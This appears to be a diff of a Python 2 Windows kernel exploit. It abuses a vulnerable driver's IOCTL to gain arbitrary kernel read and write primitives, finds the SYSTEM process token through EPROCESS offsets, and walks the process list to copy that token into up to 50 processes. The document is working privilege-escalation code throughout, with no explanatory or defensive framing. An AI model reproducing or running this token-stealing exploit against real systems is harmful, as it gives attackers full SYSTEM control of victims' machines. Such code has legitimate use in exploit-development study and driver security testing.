@@ -35,8 +35,8 @@ ThreadBasicInformation = 0
 ################################################### ADDRESSES FOR MSDN ######################################################
 
 USER_ADDR = 0x000000001a000000
-USER_WRITE_TARGET_ADDR = USER_ADDR + 0x0000 # Arbitrary offset inside BASEADDRESS 
-KERNEL_WRITE_TARGET_ADDR = 0x00 #We don't know this yet.
+USER_ADDR_OFFSET = USER_ADDR + 0x1000 # Arbitrary offset inside BASEADDRESS 
+USER_ADDR_OFFSET2 = USER_ADDR + 0x2000 # Arbitrary offset inside BASEADDRESS 
 USER_MEM_PAGE_PTR = USER_ADDR + 0x000 # Requires 16 byte offset in our defined user memory.
 CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF
 BASEADDRESS = c_ulonglong(USER_ADDR)
@@ -175,7 +175,7 @@ def get_PsISP_kernel_address(driver, kernel_base, img_name):
 
     PsISP_kernel_address = c_ulonglong()
 
-    system_EPROCESS_struct_ptr = kernelWriteToAnywhere(driver, ptr_to_system_EPROCESS_struct_ptr, USER_MEM_PAGE_PTR)
+    system_EPROCESS_struct_ptr = readValueatAddress(driver, ptr_to_system_EPROCESS_struct_ptr, USER_MEM_PAGE_PTR)
     
     print "getPsISP_kernel_address Method found system_proc_struct_base_addr as: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
 
@@ -185,21 +185,23 @@ def get_PsISP_kernel_address(driver, kernel_base, img_name):
 
 ################################################### USER WRITE FUNCTION ###########################################################
 
-def userwriteQWORD(driver, what=None, USER_MEM_PAGE_PTR=None):
+def writeWhatWhere(driver, system_token_value, where):
     
     # Write the what value to WRITE_TARGET_ADDR
-
-    data = struct.pack("<Q", what)
-    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_WRITE_TARGET_ADDR, data, len(data), byref(written))
+    data = struct.pack("<Q", system_token_value)
+    print "Write what: " + hex(system_token_value)
+    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR_OFFSET, data, len(data), byref(written))
     
+    print "What buffer contains: %08x" % cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+
     if dwStatus == 0:
         print("Something went wrong while writing to memory","e")
         sys.exit()
 
     # Pack the address of the what value and the USER_MEM_PAGE_PTR address
-
-    data = struct.pack("<Q", USER_WRITE_TARGET_ADDR) + struct.pack("<Q", USER_MEM_PAGE_PTR)
+    data = struct.pack("<Q", USER_ADDR_OFFSET) + struct.pack("<Q", where)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
+
     if dwStatus == 0:
         print("Something went wrong while writing to memory in the packing section","e")
         sys.exit()
@@ -212,15 +214,13 @@ def userwriteQWORD(driver, what=None, USER_MEM_PAGE_PTR=None):
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-    print "Value before DeviceIoControl: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-    print "Our memory target is: " + str(hex(USER_WRITE_TARGET_ADDR))
-    print "I wrote this to our memory target: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
+    print "Our memory target is: " + str(hex(where))
     return triggerIOCTL
 
 ################################################### KERNEL WRITE FUNCTION ###########################################################
 
-def kernelWriteToAnywhere(driver, target_address_of_value, target_address_to_write_over):
+def readValueatAddress(driver, target_address_of_value, target_address_to_write_over):
     
     data = struct.pack("<Q", target_address_of_value) + struct.pack("<Q", target_address_to_write_over)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
@@ -240,37 +240,6 @@ def kernelWriteToAnywhere(driver, target_address_of_value, target_address_to_wri
 
     return triggerIOCTL
 
-################################################### READ ###########################################################
-                          # is it you want to read? #We are writing it back to userland memory.
-
-def readPrimitive(driver, USER_WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR):
-
-    IoControlCode = IOCTL_code
-    InputBuffer = c_void_p(1)
-    InputBufferLength = 0x10
-    OutputBuffer = c_void_p(0)
-    OutputBufferLength = 0
-    dwBytesReturned = c_ulong()
-    lpBytesReturned = byref(dwBytesReturned)
-
-    data = struct.pack('<QQ', USER_WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR)
-    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
-
-    triggerIOCTL = kernel32.DeviceIoControl(
-        driver,
-        IoControlCode,
-        InputBuffer,
-        InputBufferLength,
-        OutputBuffer,
-        OutputBufferLength,
-        lpBytesReturned,
-        NULL,
-        )
- 
-    value_from_read = cast(USER_ADDR, POINTER(c_ulonglong))[0]
-
-    return value_from_read
-
 ############################## GET CURRENT PROCESS TOKEN OFFSET ################################
 
 def get_current_eprocess(eprocess_pointer, driver):
@@ -279,7 +248,7 @@ def get_current_eprocess(eprocess_pointer, driver):
     ACTIVE_PROC_LINK_OFFSET = 0x2e8
     TOKEN_OFFSET = 0x358
 
-    kernelWriteToAnywhere(driver, eprocess_pointer + ACTIVE_PROC_LINK_OFFSET, USER_ADDR)
+    readValueatAddress(driver, eprocess_pointer + ACTIVE_PROC_LINK_OFFSET, USER_ADDR)
 
     currentEPROCESS = cast(USER_ADDR, POINTER(c_ulonglong))[0]
 
@@ -330,14 +299,40 @@ def executeOverwrite():
         # Calculate SYSTEM token
         location_of_system_token = system_EPROCESS_struct_ptr + TOKEN_OFFSET 
 
-        kernelWriteToAnywhere(driver, location_of_system_token, USER_MEM_PAGE_PTR)
+        readValueatAddress(driver, location_of_system_token, USER_MEM_PAGE_PTR)
         system_token_value = cast(USER_ADDR, POINTER(c_ulonglong))[0]
         print "Location of SYSTEM_TOKEN is: " + hex(location_of_system_token)
         print "SYSTEM_TOKEN is: " + hex(system_token_value)
 
+        total_writes = 0
+
+        print "Finding link from system offset: "
+        ptr_firstEPROCESS = readValueatAddress(driver, system_EPROCESS_struct_ptr+0x2e8, USER_ADDR_OFFSET)
+        deref_ptr_firstEPROCESS = readValueatAddress(driver, ptr_firstEPROCESS, USER_ADDR_OFFSET)
+        backEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
         
 
-        kernelWriteToAnywhere(driver, location_of_system_token, (0xffff9d0d9d9687c0+358))
+
+        while True:
+            print "backEPROCESS is: " + hex(backEPROCESS)
+            print "Finding next link from that offset..."
+
+            ptr_forwardEPROCESS = readValueatAddress(driver, backEPROCESS, USER_ADDR_OFFSET)
+            deref_ptr_forwardEPROCESS = readValueatAddress(driver, ptr_forwardEPROCESS, USER_ADDR_OFFSET)
+            forwardEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+
+            print hex(forwardEPROCESS)
+
+
+            backEPROCESS = forwardEPROCESS
+            where=backEPROCESS+0x358
+            writeWhatWhere(driver, system_token_value, where)
+            total_writes = total_writes + 1
+
+            if total_writes > 50:
+                break
+            
+
 ############################################ RUN ################################################
 
 executeOverwrite()
